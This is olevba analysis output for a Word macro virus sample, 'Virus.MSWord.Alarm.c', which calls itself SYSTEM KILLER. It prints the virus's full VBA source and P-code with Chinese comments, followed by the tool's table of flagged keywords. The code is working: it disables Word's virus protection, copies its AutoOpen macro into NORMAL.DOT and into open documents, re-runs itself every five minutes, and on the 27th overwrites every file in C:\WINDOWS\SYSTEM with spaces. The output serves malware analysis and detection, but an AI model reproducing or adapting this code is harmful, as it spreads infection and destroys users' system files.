olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Alarm.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Alarm.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Alarm.c - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'The name is SYSTEM KILLER,Version 1.0

Public Sub MAIN()
Dim MyFile$
Dim x
Dim normal
Dim OkExist
Dim i
Dim TemplateName$
Dim active
Dim internal
Dim alarmtime
Dim alarm$

On Error GoTo PassErr

Word.Options.VirusProtection = False
If Day(Now()) = 27 Then OutBreak 'SYSTEM KILLER纪念日
'MsgBox Day(Now())

'如果未打开任何文档则运行bye2
If Application.Documents.Count = 0 Then GoTo Bye2

'设置文档模式
Dim dlg As Object
Set dlg = WordBasic.DialogRecord.FileSaveAs(False)

'获取文件名，保存在MyFile$中
MyFile$ = WordBasic.[FileName$]()
If InStr(1, MyFile$, "文档") = 1 Then
    x = WordBasic.Dialog.FileSaveAs(dlg)
    MyFile$ = dlg.Name
Else
    WordBasic.CurValues.FileSaveAs dlg
    MyFile$ = dlg.Name
End If

'如果为宏文档则执行bye2
If WordBasic.IsMacro(0) = -1 Then GoTo Bye2

'如果为新文档则执行bye1
If MyFile$ = "" Then GoTo Bye1

'以模板格式保存文件
If dlg.Format = 0 Then
    WordBasic.FileSaveAs Name:=MyFile$, Format:=1, LockAnnot:=0, Password:="", AddToMru:=1, WritePassword:="", RecommendReadOnly:=0, EmbedFonts:=0, NativePictureFormat:=0, FormsData:=0, SaveAsAOCELetter:=0
Else
    WordBasic.FileSave
End If

'在Normal模板中寻找AutoOpen宏，找到则置OkExist=1，反之则置OkExist=0
normal = WordBasic.CountMacros(0)
OkExist = 0
For i = 1 To normal
    If WordBasic.[MacroName$](i, 0) = "AutoOpen" Then OkExist = 1
Next i

'获取Normal模板的名称
TemplateName$ = WordBasic.[DefaultDir$](2) + "\NORMAL.DOT"

'把AutoOpen宏拷贝到Normal模板中
If OkExist <> 1 Then
    WordBasic.Organizer Copy:=1, Source:=MyFile$, Destination:=TemplateName$, Name:="AutoOpen", Tab:=3
    'WordBasic.FileSaveAs Name:=TemplateName$, Format:=1, LockAnnot:=0, Password:="", AddToMru:=0, WritePassword:="", RecommendReadOnly:=0, EmbedFonts:=0, NativePictureFormat:=0, FormsData:=0, SaveAsAOCELetter:=0
End If

'在活动文档中寻找AutoOpen宏，找到则置OkExist=1，反之则置OkExist=0
active = WordBasic.CountMacros(1)
OkExist = 0
For i = 1 To active
    If WordBasic.[MacroName$](i, 1) = "AutoOpen" Then OkExist = 1
Next i

'把AutoOpen宏拷贝到活动模板中
If OkExist <> 1 Then
    WordBasic.Organizer Copy:=1, Source:=TemplateName$, Destination:=MyFile$, Name:="AutoOpen", Tab:=3
    WordBasic.FileSave
End If

'设置新文档模式
Bye1:
    dlg.Format = 0

'设置定时器以便再次运行AutoOpen宏
Bye2:
    internal = 5 / 24 / 60 ' internal time is 5 minutes系统时间5分钟
    alarmtime = WordBasic.TimeValue(WordBasic.[Time$]()) + internal
    alarm$ = WordBasic.[Time$](alarmtime)
    WordBasic.OnTime alarm$, "AutoOpen"

'如果出错则此次运行不再处理
PassErr:

End Sub

Private Sub OutBreak()
Const MyPath$ = "C:\WINDOWS\SYSTEM\" '指定路径
Const Sorry$ = "Sorry,"
Const MacroName$ = "SYSTEM KILLER V1.0使 "
Const InYour$ = " 中,"
Const Info$ = "个文件被破坏."

Dim MyName() As String
Dim i, j
Dim FileNumber As Integer
Dim PutSpace
Dim TotalWrite As Integer

i = 1
ReDim MyName(1000)
'找寻第一项
MyName(i) = Dir(MyPath, 2) '用2找到隐藏文件
'开始循环
Do While MyName(i) <> ""
    'MsgBox MyName(i)
    '解决文件属性问题
    If GetAttr(MyPath & MyName(i)) <> vbNormal Then SetAttr MyPath & MyName(i), vbNormal
    i = i + 1
    If i >= 500 Then ReDim Preserve MyName(UBound(MyName) + 100)
    '查找下一个
    MyName(i) = Dir(, 2)
Loop

FileNumber = 1
Total = 0
'开始改写过程
For j = 1 To i - 1
    On Error GoTo ErrNext
    Open MyPath & MyName(j) For Binary As #FileNumber
    '清文件为n...个...
    If LOF(FileNumber) < 5 Then PutSpace = 1 Else PutSpace = LOF(FileNumber) - 4 '小文件
    Put #FileNumber, 1, Space(PutSpace)
    TotalWrite = TotalWrite + 1
    Close #FileNumber
    FileNumber = FreeFile()
ErrNext:
Next j
    MsgBox Sorry & MacroName & MyPath & InYour & Str(TotalWrite) & Info

End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Alarm.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoOpen - 8134 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0025 "The name is SYSTEM KILLER,Version 1.0"
' Line #1:
' Line #2:
' 	FuncDefn (Public Sub MAIN())
' Line #3:
' 	Dim 
' 	VarDefn MyFile
' Line #4:
' 	Dim 
' 	VarDefn x
' Line #5:
' 	Dim 
' 	VarDefn normal
' Line #6:
' 	Dim 
' 	VarDefn OkExist
' Line #7:
' 	Dim 
' 	VarDefn i
' Line #8:
' 	Dim 
' 	VarDefn TemplateName
' Line #9:
' 	Dim 
' 	VarDefn active
' Line #10:
' 	Dim 
' 	VarDefn internal
' Line #11:
' 	Dim 
' 	VarDefn alarmtime
' Line #12:
' 	Dim 
' 	VarDefn alarm
' Line #13:
' Line #14:
' 	OnError PassErr 
' Line #15:
' Line #16:
' 	LitVarSpecial (False)
' 	Ld Word 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #17:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall OutBreak 0x0000 
' 	EndIf 
' 	QuoteRem 0x0021 0x0013 "SYSTEM KILLER纪念日"
' Line #18:
' 	QuoteRem 0x0000 0x0011 "MsgBox Day(Now())"
' Line #19:
' Line #20:
' 	QuoteRem 0x0000 0x001C "如果未打开任何文档则运行bye2"
' Line #21:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Bye2 
' 	EndIf 
' Line #22:
' Line #23:
' 	QuoteRem 0x0000 0x000C "设置文档模式"
' Line #24:
' 	Dim 
' 	VarDefn dlg (As Object)
' Line #25:
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #26:
' Line #27:
' 	QuoteRem 0x0000 0x001B "获取文件名，保存在MyFile$中"
' Line #28:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St MyFile$ 
' Line #29:
' 	LitDI2 0x0001 
' 	Ld MyFile$ 
' 	LitStr 0x0004 "文档"
' 	FnInStr3 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #30:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	St x 
' Line #31:
' 	Ld dlg 
' 	MemLd New 
' 	St MyFile$ 
' Line #32:
' 	ElseBlock 
' Line #33:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #34:
' 	Ld dlg 
' 	MemLd New 
' 	St MyFile$ 
' Line #35:
' 	EndIfBlock 
' Line #36:
' Line #37:
' 	QuoteRem 0x0000 0x0016 "如果为宏文档则执行bye2"
' Line #38:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd IsMacro 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Bye2 
' 	EndIf 
' Line #39:
' Line #40:
' 	QuoteRem 0x0000 0x0016 "如果为新文档则执行bye1"
' Line #41:
' 	Ld MyFile$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Bye1 
' 	EndIf 
' Line #42:
' Line #43:
' 	QuoteRem 0x0000 0x0012 "以模板格式保存文件"
' Line #44:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	Ld MyFile$ 
' 	ParamNamed New 
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	LitDI2 0x0000 
' 	ParamNamed LockAnnot 
' 	LitStr 0x0000 ""
' 	ParamNamed Password 
' 	LitDI2 0x0001 
' 	ParamNamed AddToMru 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePassword 
' 	LitDI2 0x0000 
' 	ParamNamed RecommendReadOnly 
' 	LitDI2 0x0000 
' 	ParamNamed EmbedFonts 
' 	LitDI2 0x0000 
' 	ParamNamed NativePictureFormat 
' 	LitDI2 0x0000 
' 	ParamNamed FormsData 
' 	LitDI2 0x0000 
' 	ParamNamed SaveAsAOCELetter 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x000B 
' Line #46:
' 	ElseBlock 
' Line #47:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #48:
' 	EndIfBlock 
' Line #49:
' Line #50:
' 	QuoteRem 0x0000 0x0042 "在Normal模板中寻找AutoOpen宏，找到则置OkExist=1，反之则置OkExist=0"
' Line #51:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	St normal 
' Line #52:
' 	LitDI2 0x0000 
' 	St OkExist 
' Line #53:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld normal 
' 	For 
' Line #54:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St OkExist 
' 	EndIf 
' Line #55:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' Line #57:
' 	QuoteRem 0x0000 0x0014 "获取Normal模板的名称"
' Line #58:
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [DefaultDir$] 0x0001 
' 	LitStr 0x000B "\NORMAL.DOT"
' 	Add 
' 	St TemplateName$ 
' Line #59:
' Line #60:
' 	QuoteRem 0x0000 0x001E "把AutoOpen宏拷贝到Normal模板中"
' Line #61:
' 	Ld OkExist 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #62:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	Ld MyFile$ 
' 	ParamNamed Source 
' 	Ld TemplateName$ 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "AutoOpen"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #63:
' 	QuoteRem 0x0004 0x00CF "WordBasic.FileSaveAs Name:=TemplateName$, Format:=1, LockAnnot:=0, Password:="", AddToMru:=0, WritePassword:="", RecommendReadOnly:=0, EmbedFonts:=0, NativePictureFormat:=0, FormsData:=0, SaveAsAOCELetter:=0"
' Line #64:
' 	EndIfBlock 
' Line #65:
' Line #66:
' 	QuoteRem 0x0000 0x0040 "在活动文档中寻找AutoOpen宏，找到则置OkExist=1，反之则置OkExist=0"
' Line #67:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	St active 
' Line #68:
' 	LitDI2 0x0000 
' 	St OkExist 
' Line #69:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld active 
' 	For 
' Line #70:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0008 "AutoOpen"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St OkExist 
' 	EndIf 
' Line #71:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #72:
' Line #73:
' 	QuoteRem 0x0000 0x001C "把AutoOpen宏拷贝到活动模板中"
' Line #74:
' 	Ld OkExist 
' 	LitDI2 0x0001 
' 	Ne 
' 	IfBlock 
' Line #75:
' 	LitDI2 0x0001 
' 	ParamNamed Copy 
' 	Ld TemplateName$ 
' 	ParamNamed Source 
' 	Ld MyFile$ 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "AutoOpen"
' 	ParamNamed New 
' 	LitDI2 0x0003 
' 	ParamNamed Text 
' 	Ld WordBasic 
' 	ArgsMemCall Organizer 0x0005 
' Line #76:
' 	Ld WordBasic 
' 	ArgsMemCall FileSave 0x0000 
' Line #77:
' 	EndIfBlock 
' Line #78:
' Line #79:
' 	QuoteRem 0x0000 0x000E "设置新文档模式"
' Line #80:
' 	Label Bye1 
' Line #81:
' 	LitDI2 0x0000 
' 	Ld dlg 
' 	MemSt Format$ 
' Line #82:
' Line #83:
' 	QuoteRem 0x0000 0x0020 "设置定时器以便再次运行AutoOpen宏"
' Line #84:
' 	Label Bye2 
' Line #85:
' 	LitDI2 0x0005 
' 	LitDI2 0x0018 
' 	Div 
' 	LitDI2 0x003C 
' 	Div 
' 	St internal 
' 	QuoteRem 0x001B 0x0028 " internal time is 5 minutes系统时间5分钟"
' Line #86:
' 	Ld WordBasic 
' 	ArgsMemLd [Time$] 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd TimeValue 0x0001 
' 	Ld internal 
' 	Add 
' 	St alarmtime 
' Line #87:
' 	Ld alarmtime 
' 	Ld WordBasic 
' 	ArgsMemLd [Time$] 0x0001 
' 	St alarm$ 
' Line #88:
' 	Ld alarm$ 
' 	LitStr 0x0008 "AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemCall OnTime 0x0002 
' Line #89:
' Line #90:
' 	QuoteRem 0x0000 0x001A "如果出错则此次运行不再处理"
' Line #91:
' 	Label PassErr 
' Line #92:
' Line #93:
' 	EndSub 
' Line #94:
' Line #95:
' 	FuncDefn (Private Sub OutBreak())
' Line #96:
' 	Dim (Const) 
' 	LitStr 0x0012 "C:\WINDOWS\SYSTEM\"
' 	VarDefn MyPath
' 	QuoteRem 0x0025 0x0008 "指定路径"
' Line #97:
' 	Dim (Const) 
' 	LitStr 0x0006 "Sorry,"
' 	VarDefn Sorry
' Line #98:
' 	Dim (Const) 
' 	LitStr 0x0015 "SYSTEM KILLER V1.0使 "
' 	VarDefn MacroName
' Line #99:
' 	Dim (Const) 
' 	LitStr 0x0004 " 中,"
' 	VarDefn InYour
' Line #100:
' 	Dim (Const) 
' 	LitStr 0x000D "个文件被破坏."
' 	VarDefn Info
' Line #101:
' Line #102:
' 	Dim 
' 	VarDefn MyName (As String)
' Line #103:
' 	Dim 
' 	VarDefn i
' 	VarDefn j
' Line #104:
' 	Dim 
' 	VarDefn FileNumber (As Integer)
' Line #105:
' 	Dim 
' 	VarDefn PutSpace
' Line #106:
' 	Dim 
' 	VarDefn TotalWrite (As Integer)
' Line #107:
' Line #108:
' 	LitDI2 0x0001 
' 	St i 
' Line #109:
' 	OptionBase 
' 	LitDI2 0x03E8 
' 	Redim MyName 0x0001 (As Variant)
' Line #110:
' 	QuoteRem 0x0000 0x000A "找寻第一项"
' Line #111:
' 	Ld MyPath 
' 	LitDI2 0x0002 
' 	ArgsLd Dir 0x0002 
' 	Ld i 
' 	ArgsSt MyName 0x0001 
' 	QuoteRem 0x001B 0x000F "用2找到隐藏文件"
' Line #112:
' 	QuoteRem 0x0000 0x0008 "开始循环"
' Line #113:
' 	Ld i 
' 	ArgsLd MyName 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #114:
' 	QuoteRem 0x0004 0x0010 "MsgBox MyName(i)"
' Line #115:
' 	QuoteRem 0x0004 0x0010 "解决文件属性问题"
' Line #116:
' 	Ld MyPath 
' 	Ld i 
' 	ArgsLd MyName 0x0001 
' 	Concat 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbNormal 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld MyPath 
' 	Ld i 
' 	ArgsLd MyName 0x0001 
' 	Concat 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #117:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #118:
' 	Ld i 
' 	LitDI2 0x01F4 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	OptionBase 
' 	Ld MyName 
' 	FnUBound 0x0000 
' 	LitDI2 0x0064 
' 	Add 
' 	Redim (Preserve) MyName 0x0001 (As Variant)
' 	EndIf 
' Line #119:
' 	QuoteRem 0x0004 0x000A "查找下一个"
' Line #120:
' 	ParamOmitted 
' 	LitDI2 0x0002 
' 	ArgsLd Dir 0x0002 
' 	Ld i 
' 	ArgsSt MyName 0x0001 
' Line #121:
' 	Loop 
' Line #122:
' Line #123:
' 	LitDI2 0x0001 
' 	St FileNumber 
' Line #124:
' 	LitDI2 0x0000 
' 	St Total 
' Line #125:
' 	QuoteRem 0x0000 0x000C "开始改写过程"
' Line #126:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #127:
' 	OnError ErrNext 
' Line #128:
' 	Ld MyPath 
' 	Ld j 
' 	ArgsLd MyName 0x0001 
' 	Concat 
' 	Ld FileNumber 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary)
' Line #129:
' 	QuoteRem 0x0004 0x0011 "清文件为n...个..."
' Line #130:
' 	Ld FileNumber 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0005 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St PutSpace 
' 	Else 
' 	BoSImplicit 
' 	Ld FileNumber 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0004 
' 	Sub 
' 	St PutSpace 
' 	EndIf 
' 	QuoteRem 0x0051 0x0006 "小文件"
' Line #131:
' 	Ld FileNumber 
' 	Sharp 
' 	LitDI2 0x0001 
' 	Ld PutSpace 
' 	ArgsLd Space 0x0001 
' 	PutRec 
' Line #132:
' 	Ld TotalWrite 
' 	LitDI2 0x0001 
' 	Add 
' 	St TotalWrite 
' Line #133:
' 	Ld FileNumber 
' 	Sharp 
' 	Close 0x0001 
' Line #134:
' 	ArgsLd Friend 0x0000 
' 	St FileNumber 
' Line #135:
' 	Label ErrNext 
' Line #136:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #137:
' 	Ld Sorry 
' 	Ld MacroName 
' 	Concat 
' 	Ld MyPath 
' 	Concat 
' 	Ld InYour 
' 	Concat 
' 	Ld TotalWrite 
' 	ArgsLd Str 0x0001 
' 	Concat 
' 	Ld Info 
' 	Concat 
' 	ArgsCall MsgBox 0x0001 
' Line #138:
' Line #139:
' 	EndSub 
' Line #140:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

